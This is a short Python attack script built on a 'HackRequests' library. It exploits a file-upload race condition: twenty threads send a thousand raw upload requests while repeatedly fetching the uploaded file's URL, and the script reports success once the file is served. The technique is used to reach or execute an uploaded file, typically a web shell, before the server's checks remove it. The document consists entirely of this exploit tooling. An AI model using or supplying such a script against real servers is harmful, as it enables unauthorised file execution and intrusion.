from concurrent.futures import ThreadPoolExecutor
import lib.HackRequests as HackRequests

task_status = 0

def uploadfile(data):
    global task_status
    if task_status==1:
        return 'Success'
    hack = HackRequests.hackRequests()
    hack.httpraw(data)

def requestfile(url):
    global task_status
    if task_status==1:
        return 'Success'
    hack = HackRequests.hackRequests()
    req = hack.http(url)
    if req.status_code == 200:
        print('[+] Success!')
        task_status = 1

def race(data,url):
    with ThreadPoolExecutor(20) as pool:
        for i in range(1000):
            pool.submit(uploadfile,data)
            pool.submit(requestfile,url)